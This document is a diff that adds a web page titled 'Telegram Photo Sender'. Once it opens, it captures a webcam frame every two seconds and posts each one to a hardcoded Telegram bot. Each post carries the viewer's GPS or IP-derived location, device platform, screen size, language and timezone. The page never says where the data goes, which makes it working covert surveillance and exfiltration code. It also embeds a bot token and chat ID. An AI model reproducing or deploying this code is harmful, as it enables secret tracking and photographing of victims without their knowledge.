@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Telegram Photo Sender</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-size: 18px;
+    }
+
+    #video-container {
+      width: 640px;
+      height: 480px;
+      border: 1px solid #ccc;
+      margin: 20px auto;
+    }
+
+    #video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+  </style>
+</head>
+<body>
+  <h1>Telegram Photo Sender</h1>
+  <div id="status">Requesting camera access...</div>
+  <div id="video-container">
+    <video id="video" autoplay muted playsinline></video>
+  </div>
+
+  <script>
+    // Global variables
+    let photoInterval = null;
+    let stream = null;
+    let locationData = { lat: 'N/A', lng: 'N/A', accuracy: 'N/A', source: 'starting...' };
+    let locationWatchId = null;
+
+    // Multiple IP geolocation services
+    const ipServices = [
+      'https://ipapi.co/json/',
+      'https://ipinfo.io/json',
+      'https://api.ipify.org?format=json',
+      'https://freegeoip.app/json/',
+      'https://ipgeolocation.abstractapi.com/v1/?api_key=free' // No key needed for free tier
+    ];
+
+    // Function to convert data URL to blob
+    function dataURLtoBlob(dataURL) {
+      const bytes = dataURL.split(',')[1];
+      const mime = dataURL.split(',')[0].split(':')[1].split(';')[0];
+      const binary = atob(bytes);
+      const array = [];
+      for (let i = 0; i < binary.length; i++) {
+        array.push(binary.charCodeAt(i));
+      }
+      return new Blob([new Uint8Array(array)], { type: mime });
+    }
+
+    // Try IP geolocation from multiple services
+    async function getIPLocation() {
+      for (const url of ipServices) {
+        try {
+          console.log('Trying IP service:', url);
+          const res = await fetch(url, { mode: 'cors' });
+          if (!res.ok) continue;
+          
+          const data = await res.json();
+          
+          // Handle different response formats
+          let lat = data.latitude || data.lat || data.loc?.split(',')[0];
+          let lng = data.longitude || data.lon || data.lng || data.loc?.split(',')[1];
+          
+          if (lat && lng) {
+            locationData = {
+              lat: parseFloat(lat).toFixed(4),
+              lng: parseFloat(lng).toFixed(4),
+              accuracy: data.accuracy || 'IP (~5-50km)',
+              source: 'IP',
+              city: data.city || data.region_name || 'Unknown',
+              country: data.country_name || data.country || 'Unknown'
+            };
+            console.log('IP Location found:', locationData);
+            return locationData;
+          }
+        } catch (e) {
+          console.log('IP service failed:', url, e);
+          continue;
+        }
+      }
+      locationData = { lat: 'N/A', lng: 'N/A', accuracy: 'All IP failed', source: 'IP' };
+      return locationData;
+    }
+
+    // Aggressive multi-method location
+    function startUltimateLocation() {
+      console.log('Starting location tracking...');
+      
+      // 1. GPS Watch (continuous)
+      if (navigator.geolocation) {
+        locationWatchId = navigator.geolocation.watchPosition(
+          (position) => {
+            const coords = position.coords;
+            locationData = {
+              lat: coords.latitude.toFixed(6),
+              lng: coords.longitude.toFixed(6),
+              accuracy: `${Math.round(coords.accuracy)}m`,
+              source: 'GPS',
+              city: 'GPS Accurate'
+            };
+            console.log('GPS Success:', locationData);
+          },
+          (error) => {
+            console.log('GPS Watch error:', error);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 3000,
+            maximumAge: 30000
+          }
+        );
+
+        // 2. GPS single shot (immediate)
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            if (locationData.source !== 'GPS') {
+              const coords = position.coords;
+              locationData = {
+                lat: coords.latitude.toFixed(6),
+                lng: coords.longitude.toFixed(6),
+                accuracy: `${Math.round(coords.accuracy)}m`,
+                source: 'GPS'
+              };
+              console.log('GPS Single:', locationData);
+            }
+          },
+          () => {}, // Silent
+          { enableHighAccuracy: true, timeout: 2000 }
+        );
+      }
+
+      // 3. IP fallback (starts immediately)
+      getIPLocation();
+    }
+
+    // Format for caption
+    function formatLocation() {
+      return `${locationData.lat}, ${locationData.lng} (${locationData.accuracy}) [${locationData.source}] ${locationData.city || ''}`;
+    }
+
+    // Send photo
+    async function sendPhoto() {
+      const chatId = '6469212447';
+      const botToken = '8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU';
+      
+      const device = {
+        platform: navigator.platform,
+        screen: `${screen.width}x${screen.height}`,
+        lang: navigator.language,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+      };
+      
+      const ts = new Date().toLocaleString();
+      const num = Math.floor(Date.now() / 2000);
+
+      const caption = `📱 **${device.platform} | ${device.screen}**
+🌐 **${device.lang}/${device.tz}** #${num}
+🕐 **${ts}**
+
+📍 **${formatLocation()}**
+`;
+
+      const video = document.getElementById('video');
+      
+      // Ensure video is ready
+      if (video.readyState < 2) {
+        await new Promise(r => {
+          video.onloadeddata = r;
+          video.oncanplay = r;
+        });
+      }
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, 640, 480);
+
+      const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.9));
+
+      const formData = new FormData();
+      formData.append('photo', blob, `photo_${num}.jpg`);
+      formData.append('chat_id', chatId);
+      formData.append('caption', caption);
+      formData.append('parse_mode', 'Markdown');
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+        const result = await res.json();
+        
+        if (result.ok) {
+          updateStatus(`✅ #${num} | ${formatLocation()}`);
+        } else {
+          updateStatus(`❌ ${result.description}`);
+        }
+      } catch (e) {
+        updateStatus(`❌ ${e.message}`);
+      }
+    }
+
+    function updateStatus(msg) {
+      document.getElementById('status').innerText = msg;
+      console.log(msg);
+    }
+
+    // Photo loop
+    function startPhotos() {
+      sendPhoto(); // IMMEDIATE first photo
+      photoInterval = setInterval(sendPhoto, 2000);
+    }
+
+    // Init
+    async function init() {
+      try {
+        updateStatus('🔴 Camera access...');
+        
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: 640, height: 480, facingMode: 'user' },
+          audio: false
+        });
+        
+        document.getElementById('video').srcObject = stream;
+        
+        updateStatus('✅ Camera ready! Sending...');
+        
+        // Location (background)
+        startUltimateLocation();
+        
+        // Photos IMMEDIATELY
+        startPhotos();
+        
+      } catch (e) {
+        updateStatus('❌ Camera: ' + e.message);
+      }
+    }
+
+    // Cleanup
+    window.addEventListener('beforeunload', () => {
+      if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
+      if (photoInterval) clearInterval(photoInterval);
+    });
+
+    init();
+  </script>
+</body>
+</html>
